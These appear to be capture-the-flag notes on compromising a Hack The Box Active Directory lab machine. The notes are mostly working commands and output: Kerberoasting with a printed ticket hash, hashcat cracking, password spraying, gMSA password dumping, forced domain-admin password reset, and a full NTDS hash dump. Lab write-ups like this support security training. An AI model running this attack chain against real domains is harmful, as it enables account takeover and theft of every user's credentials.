Ip address - 10.129.248.115

Obtained a list of Users from website "team managment"
(organized the users in {first}.{last} format to get some valid users )

**Users** 
`keely.lyons`
`sierra.frye`
`dax.santiago`
`research`
`hope.sharp `

`gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://search.htb/images/ -x jpg,html,php`
- `/slide_2.jpg ` - has an image with password and user 
- 
hope.sharp:IsolationIsKey?
`GetUserSPNs.py search.htb/hope.sharp:IsolationIsKey? -dc-ip 10.129.248.115 -request`
**Kerberoastable** 
`GetUserSPNs.py search.htb/hope.sharp:IsolationIsKey? -dc-ip 10.129.248.115 -request`

```
$krb5tgs$23$*web_svc$SEARCH.HTB$RESEARCH/web_svc.search.htb~60001*$3deb99e474e0ed22db0c1645b15a5150$9dcc9746f27f7690166aa478cbeed2d2d529139b79ef97ba164263957dffa45e87cd85f639d633dceacd233da8626f9451d65d1360341b895270b105caf1a19e8cbae0a3d3190251d2776841839f2dabd50269d094dce6d2be0842fa5f5758bc9c328d9c4bbc1921e722cea8cc8bcc21c5c1965a6b240c2fe657672d5ac2eff9c115582353ecadddc9d6c1bc7bce38efb17683f083598c055f7704fb15d90c577ad0321279c461d5a274d0e9ee5067b2d8ee38c93693b3727d62e1bcd8250e4ea910551b523a859268da7620473b292b6ae4d0d51bc620edd2973e8c95d3a7d528a3ff130a877a078fc92077cddde15ff7e425314d9afdd159178510921377484d77f167a6f11a513898c2379e476757ba8f8f776cf3f9be42d6dcdab2c66722c3b6067bd3dc4bd6c670369f2d141bfdb4d5d8978e11390d9eaf2499197a7eca77da4f117aafc554131ab43bec59a1ec219f33fcfc2621422400abef87dcfd9e5d97f60da0329ae61d11ea92150872b0aa076bd32ea0d8fcea531d23f9c74bf6e3fbf31a6173aadc4de04af4c49c0aa10c48271972a71f8efc67765beb4c5a593585cd398e6dd45843926ba6afdf35629c3396537530933762c0132d7ce7da6349c590645b74b16dab9acbe63e2aa858d2de8e0a9986def81781be6898731819aa18a892079bb648e29a7355ad8c4fba768030775c20d7ca62142b789570614dd852e3de829eae4b099e60cb909da2bfd9a444560f1b2b027e710f3f4e75f37b588c025061d39d7beb2487cd5ad11693d49f5372cc2a73e13146157bd975193a0daf23790dbaa5ef1809f0e45a17307a1d4c3a9ac9a2dc27f5a35bf7bf5ba83f23d654b0fbfbe0bd2e1d6812b452f0d5cd37ff55654fabf016de010b50bc8b18b5b68a4d1a6b53abbce38d08ef12f895f95bada005198c9c232e8c1701fc3f79092f7ce9418cdad5ffa9c78f6bf553bcc480e5f2b59022777d2efad148b5e8a9d13333c299a5d98a37ed6e0af701a90624568b7fe94623ebdd6d6205fd19d038e9c45e80001965c4e1ef2c7410823d4304ffd00395ff83a75ee4543c68fcad5e4444930882aef0267170a6e386d2e598a03998edf6333056484d648a0c8f708507612c57a2a19b59ef9643fdfeb164fb63e5ba6022a13a81b60a2c6e18807956d1e428a0b16a88344e1bdcf81b662bb278df4dfd2b21e1332551300fa548fcf5f405a6461ec1f0f3da5f24b1f29520b19adc8b463c95429d4dfe28dd1c56b50e03d2ec498c5107f8f16de1a3b432b31ea75f16523aa3e5987e483a3054166ea22576fc6a377e1468a45427e55c1693153b1cd50d4c8b4377b0fb5c294e386a656381c3610190199322c6b8e9c6df3faa280fcd7ff7f0e535d0bb5be299e3f85e34dfa09fbc8d4a707a05219f1657b03e0f8f7d7780d5e93c424c9eca97175dd3bfabe77ce97ff9dda48ad028e7726fd221e0e68e59
```
- Cracked password using hashcat 
`hashcat -m 13100 krbhash /usr/share/wordlists/rockyou.txt`

web_svc:@3ONEmillionbaby

Interesting domain admin (user):
- TRISTAN.DAVIES@SEARCH.HTB

Interesting users: 
- BIR-ADFS-GMSA

`crackmapexec smb 10.129.248.115 -u users.lst -p '@3ONEmillionbaby'`
edgar.jacobs:@3ONEmillionbaby
(helpdesk share is readable )
*Users to BIR-ADFS-GMSA*
abby.gonzalez
camren.luna
sierra.frye
keely.lyons
rene.larson
**Found files** (in edgar's files)
`Phishing_Attempt.xlsx` (found usernames)
```
Payton.Harmon
Cortez.Hickman
Bobby.Wolf
Margaret.Robinson
Scarlett.Parks
Eliezer.Jordan
Hunter.Kirby
Sierra.Frye
Annabelle.Wells
Eve.Galvan
Jeramiah.Fritz
Abby.Gonzalez
Joy.Costa
Vincent.Sutton
```
	
	
covid.search.htb
	
`mount -t cifs -o vers=2.0,username=edgar.jacobs //10.129.248.115/RedirectedFolders$ /mnt/`

**Excel file** 
(deleted)
```
<sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
```
```
1.  Press the control key on your keyboard, then press A A. It’s Control, then A, then A again, you need to press A twice.
2.  Now, press the Alt key then H O U L. That’s Alt, then H, then O, then U, then L.
```
(Unhiding the rows and columns)
    Passwords - 
```
;;36!cried!INDIA!year!50;;

..10-time-TALK-proud-66..

??47^before^WORLD^surprise^91??

//51+mountain+DEAR+noise+83//

++47|building|WARSAW|gave|60++

!!05_goes_SEVEN_offer_83!!

~~27%when%VILLAGE%full%00~~

$$49=wide=STRAIGHT=jordan=28$$18

==95~pass~QUIET~austria~77==

//61!banker!FANCY!measure!25//

??40:student:MAYOR:been:66??

&&75:major:RADIO:state:93&&

**30*venus*BALL*office*42**

**24&moment&BRAZIL&members&66**
```
Valid credentials - 
`sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18`
**User flag **- `2f73ab0591a8a55e58ef929cac83b329`
*Looking at blodhound queries the user sierra.frye has readgmsapassword for the user BIR-ADFS-GMSA$*
`python3 /root/Hackthebox/intelligence/krbrelayx/gMSADumper/gMSADumper.py -u 'sierra.frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb`

`BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f`

`ticketer.py -nthash e1e9fd9e46d0d747e1595167eedcec0f -domain-sid S-1-5-21-271492789-1610487937-1871574529 -domain search.htb BIR-ADFS-GMSA$
`
*Found in backups folder, staff.pfx* (cracking the pfx )
`go run cmd/main.go crack -c ~/Hackthebox/search/pyLAPS/Backups/staff.pfx  -f /usr/share/wordlists/rockyou.txt`
passsword is - `misspissy`
*Importing the certificate as ours and visiting /staff page to have an login prompt*

`$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA$' -Properties 'msDS-ManagedPassword'`
`$managed = $gmsa.'msDS-ManagedPassword'`
 `  $blob = ConvertFrom-ADManagedPasswordBlob $managed`
 ```
 1.  ```
    $username = 'BIR-ADFS-GMSA$'
    $cred = New-Object System.Management.Automation.PSCredential $username, $blob.SecureCurrentPassword
    Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {whoami}
    ```
```

Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {$password = "Admin123!@" | ConvertTo-SecureString -AsPlainText -Force}
 Set-LocalUser -Name 'TestUser' -Password $password -Verbose
 ```
 Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {Set-ADAccountPassword -Identity 'tristan.davies'

 -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "welcome@123" -Force)}
 Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {$newPassword = (Read-Host -Prompt "Provide New P

assword" -AsSecureString)}
 
 ```
 
` tristan.davies:welcome@123`

`secretsdump.py search/tristan.davies:'welcome@123'@10.10.11.129`
administrator:5e3c0abbe0b4163c5612afe25c69ced6
**Root flag** 
`0b07a2b8eb4bbf264bb7019ac3d777ae`
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cd69d23e4383daa5b0f42d29dba9529a:::
search.htb\Santino.Benjamin:1194:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Payton.Harmon:1195:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Trace.Ryan:1196:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Reginald.Morton:1197:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Eddie.Stevens:1198:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Cortez.Hickman:1199:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Chace.Oneill:1200:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Abril.Suarez:1201:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Savanah.Velazquez:1202:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Antony.Russo:1203:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Cameron.Melendez:1204:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Edith.Walls:1205:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Lane.Wu:1206:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Arielle.Schultz:1207:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Bobby.Wolf:1208:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Blaine.Zavala:1209:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Margaret.Robinson:1210:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Celia.Moreno:1211:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Kaitlynn.Lee:1212:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Kyler.Arias:1213:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Saniyah.Roy:1214:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Sarai.Boone:1215:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Jermaine.Franco:1216:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Alfred.Chan:1217:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Jamar.Holt:1218:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Sandra.Wolfe:1219:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Rene.Larson:1220:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Yareli.Mcintyre:1221:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Griffin.Maddox:1222:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Prince.Hobbs:1223:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Armando.Nash:1224:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Sonia.Schneider:1225:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Maeve.Mann:1226:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Lizeth.Love:1227:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Amare.Serrano:1228:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Savanah.Knox:1229:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Frederick.Cuevas:1230:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Marshall.Skinner:1231:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Edgar.Jacobs:1232:aad3b435b51404eeaad3b435b51404ee:92b9467a379658c07e2341b45a090a3c:::
search.htb\Elisha.Watts:1233:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Belen.Compton:1234:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Amari.Mora:1235:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Cadence.Conner:1236:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Katelynn.Costa:1237:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Sage.Henson:1238:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Maren.Guzman:1239:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Natasha.Mayer:1240:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Chanel.Bell:1241:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Scarlett.Parks:1242:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Eliezer.Jordan:1243:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Dax.Santiago:1244:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Lillie.Saunders:1245:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Jayla.Roberts:1246:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Lorelei.Huang:1247:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Taniya.Hardy:1248:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Charlee.Wilkinson:1249:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Monique.Moreno:1250:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Desmond.Bonilla:1251:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Claudia.Sharp:1252:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Abbigail.Turner:1253:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Yaritza.Riddle:1254:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Tori.Mora:1255:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Hugo.Forbes:1256:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Jolie.Lee:1257:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\German.Rice:1258:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Zain.Hopkins:1259:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Hope.Sharp:1260:aad3b435b51404eeaad3b435b51404ee:b9e899a77ef9cbba759806261bc198ab:::
search.htb\Kylee.Davila:1261:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Melanie.Santiago:1262:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Hunter.Kirby:1263:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Annabelle.Wells:1264:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Ada.Gillespie:1265:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Gunnar.Callahan:1266:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Aarav.Fry:1267:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Colby.Russell:1268:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Eve.Galvan:1269:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Jeramiah.Fritz:1270:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Cade.Austin:1271:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Keely.Lyons:1272:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Abby.Gonzalez:1273:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Joy.Costa:1274:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Vincent.Sutton:1275:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Cesar.Yang:1276:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Camren.Luna:1277:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Tyshawn.Peck:1278:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Keith.Hester:1279:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Braeden.Rasmussen:1280:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Angel.Atkinson:1281:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Sierra.Frye:1282:aad3b435b51404eeaad3b435b51404ee:1a20c0a58bef312b4529911830da0910:::
search.htb\Maci.Graves:1283:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Judah.Frye:1284:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Tristen.Christian:1285:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Crystal.Greer:1286:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Kayley.Ferguson:1287:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Haven.Summers:1288:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Isabela.Estrada:1289:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Kaylin.Bird:1290:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Angie.Duffy:1291:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Claudia.Pugh:1292:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\Jordan.Gregory:1293:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::
search.htb\web_svc:1296:aad3b435b51404eeaad3b435b51404ee:92b9467a379658c07e2341b45a090a3c:::
search.htb\Tristan.Davies:1298:aad3b435b51404eeaad3b435b51404ee:6ecbfdf6f1995b12c823606c0971ec49:::
RESEARCH$:1001:aad3b435b51404eeaad3b435b51404ee:1ee5a577378680625d4594c9cca4a131:::
COVID$:1104:aad3b435b51404eeaad3b435b51404ee:41de0a4cfc0feef4e09b9da13cb2acb4:::
LON-SVRDFS1$:1181:aad3b435b51404eeaad3b435b51404ee:0e67fed376cf7f697eb0203aedb96e82:::
LON-SVRDFS2$:1182:aad3b435b51404eeaad3b435b51404ee:1c51f9b3412d6a7b2fd47e7e8abe8769:::
BIR-SVRDFS1$:1183:aad3b435b51404eeaad3b435b51404ee:08c6c03aa1586f621e5472a8864a336e:::
BIR-SVRDFS2$:1184:aad3b435b51404eeaad3b435b51404ee:15d740f7fc668043e22dcbe00a086e25:::
MAN-SVRDFS1$:1185:aad3b435b51404eeaad3b435b51404ee:5019a462967a86be56c304d64543ea95:::
MAN-SVRDFS2$:1186:aad3b435b51404eeaad3b435b51404ee:c87f23b9db23cb784ff2cb4752690432:::
GLA-SVRDFS1$:1187:aad3b435b51404eeaad3b435b51404ee:9a2b09e36379c3ef326f96119f5f9858:::
GLA-SVRDFS2$:1188:aad3b435b51404eeaad3b435b51404ee:84fd6b2e3fbdaa5090b8a8a7c2803b78:::
SHE-SVRDFS1$:1191:aad3b435b51404eeaad3b435b51404ee:8c1758b5b6e6d68d4fcf57c682999280:::
SHE-SVRDFS2$:1192:aad3b435b51404eeaad3b435b51404ee:8349fa47cf58bb56036f920b05ac242b:::
BIR-ADFS-GMSA$:1299:aad3b435b51404eeaad3b435b51404ee:e1e9fd9e46d0d747e1595167eedcec0f:::
WINDOWS-01$:1602:aad3b435b51404eeaad3b435b51404ee:64f859500be748b10ad3b844d9a48dbf:::
WINDOWS-02$:1603:aad3b435b51404eeaad3b435b51404ee:887acbc93156adc9b4fdf6a190c1295d:::
WINDOWS-03$:1604:aad3b435b51404eeaad3b435b51404ee:f74dc404b50b8b3ab6bd252c7b22e72b:::
WINDOWS-04$:1605:aad3b435b51404eeaad3b435b51404ee:ce480ee33c6005ec64499c9cbdfdedb2:::
WINDOWS-05$:1606:aad3b435b51404eeaad3b435b51404ee:a6e85b04ba37eae66bdbb7196718c6be:::
WINDOWS-06$:1607:aad3b435b51404eeaad3b435b51404ee:c01732ff53c4e9171778f6da6d73061e:::
WINDOWS-07$:1608:aad3b435b51404eeaad3b435b51404ee:d03840ac8844e707c7d447a7fb9a600c:::
WINDOWS-08$:1609:aad3b435b51404eeaad3b435b51404ee:15e51b0a2ed68ac44ee26098a4ebb83c:::
WINDOWS-09$:1610:aad3b435b51404eeaad3b435b51404ee:42294b583b8028f5ff2c71c3dca0207b:::
WINDOWS-10$:1611:aad3b435b51404eeaad3b435b51404ee:70e2ff9c336a68006ca1a9f2f2b86df5:::
WINDOWS-11$:1612:aad3b435b51404eeaad3b435b51404ee:f9deef6a215559c305caef89308f1fac:::
WINDOWS-12$:1613:aad3b435b51404eeaad3b435b51404ee:ccbc5f62b7449104d5da564ceda7a449:::
WINDOWS-13$:1614:aad3b435b51404eeaad3b435b51404ee:c6da1c90a9d5f72025fbe3df2a2bd33e:::
WINDOWS-14$:1615:aad3b435b51404eeaad3b435b51404ee:6be5eec8a78fa1565339dd36cd18e3db:::
WINDOWS-15$:1616:aad3b435b51404eeaad3b435b51404ee:e8f48daba9a732f339b731b11883f39e:::
WINDOWS-16$:1617:aad3b435b51404eeaad3b435b51404ee:12e2fa927f4e48f6b9b33f30dd0a549f:::
WINDOWS-17$:1618:aad3b435b51404eeaad3b435b51404ee:0a652d20d62a7beca2b0bfb4e19b3fef:::
WINDOWS-18$:1619:aad3b435b51404eeaad3b435b51404ee:6a707f9323839ab1ce622ddd617f2d0b:::
WINDOWS-19$:1620:aad3b435b51404eeaad3b435b51404ee:de4e3a8027d610b5d73e386b067646ee:::
WINDOWS-20$:1621:aad3b435b51404eeaad3b435b51404ee:a303c1b635eee866ab4e83f680bb20b3:::
WINDOWS-21$:1622:aad3b435b51404eeaad3b435b51404ee:0ec268fd067bc06070deee2cb61f4113:::
WINDOWS-22$:1623:aad3b435b51404eeaad3b435b51404ee:16a36bda01fc38d20e2b2e34b2ec3674:::
WINDOWS-23$:1624:aad3b435b51404eeaad3b435b51404ee:f1b4369cb699fa3453f7d979f94722d3:::
WINDOWS-24$:1625:aad3b435b51404eeaad3b435b51404ee:89327d82029b45789c1a581b9ae0303b:::
WINDOWS-25$:1626:aad3b435b51404eeaad3b435b51404ee:3f306a3e0437f6194d870394e9be7bd9:::
WINDOWS-26$:1627:aad3b435b51404eeaad3b435b51404ee:d7a65645cfb576383c2ffe5498905311:::
WINDOWS-27$:1628:aad3b435b51404eeaad3b435b51404ee:2410b29876299812872844e9dbe82a08:::
WINDOWS-28$:1629:aad3b435b51404eeaad3b435b51404ee:0ae911985bcd607e11daed058cdc2087:::
WINDOWS-29$:1630:aad3b435b51404eeaad3b435b51404ee:a6beb7f378057eacce403f94798d86f6:::
WINDOWS-30$:1631:aad3b435b51404eeaad3b435b51404ee:f62b42efe6ff1268158900cfbf864ccd:::
WINDOWS-31$:1632:aad3b435b51404eeaad3b435b51404ee:d61b03d3a540bd52e0f71c48ec8187fe:::
WINDOWS-32$:1633:aad3b435b51404eeaad3b435b51404ee:b5c28fa51adb9436c1809ecbc233d450:::
WINDOWS-33$:1634:aad3b435b51404eeaad3b435b51404ee:b6784c82ef2a01af731859f7db1b6d55:::
WINDOWS-34$:1635:aad3b435b51404eeaad3b435b51404ee:9fb24b92ab74ab2e61ce1e672ab95e35:::
WINDOWS-35$:1636:aad3b435b51404eeaad3b435b51404ee:3a79fef28a9ea597b8227fcac965598f:::
WINDOWS-36$:1637:aad3b435b51404eeaad3b435b51404ee:62eda715c657b1dc424636e12bb25d98:::
WINDOWS-37$:1638:aad3b435b51404eeaad3b435b51404ee:e0a9d758e0ec6f5c02f71db559ec0add:::
WINDOWS-38$:1639:aad3b435b51404eeaad3b435b51404ee:5f4910829649bfb0f240f372bd093442:::
WINDOWS-39$:1640:aad3b435b51404eeaad3b435b51404ee:85aa6048c021ebb506da44d0f83d39aa:::
WINDOWS-40$:1641:aad3b435b51404eeaad3b435b51404ee:5baff1d9b74a46b86bce1540b20be526:::
WINDOWS-41$:1642:aad3b435b51404eeaad3b435b51404ee:e89b52c81ff9ce71ebe74fee38c49180:::
WINDOWS-42$:1643:aad3b435b51404eeaad3b435b51404ee:f9dc7da62ed1d0a23e6dd17370808534:::
WINDOWS-43$:1644:aad3b435b51404eeaad3b435b51404ee:f882c7ddce520e205025a4cc7fe346c7:::
WINDOWS-44$:1645:aad3b435b51404eeaad3b435b51404ee:f33fa35138658ac67b19237069166716:::
WINDOWS-45$:1646:aad3b435b51404eeaad3b435b51404ee:1a732b150bc17e2cbe2058ce4955fd4a:::
WINDOWS-46$:1647:aad3b435b51404eeaad3b435b51404ee:2cab6ac05f29ddee8ad93008415fef4d:::
WINDOWS-47$:1648:aad3b435b51404eeaad3b435b51404ee:7bcb7bd63450703a8d48279fe2ac553d:::
WINDOWS-48$:1649:aad3b435b51404eeaad3b435b51404ee:f132304c70789d889b10878bcbdda122:::
```
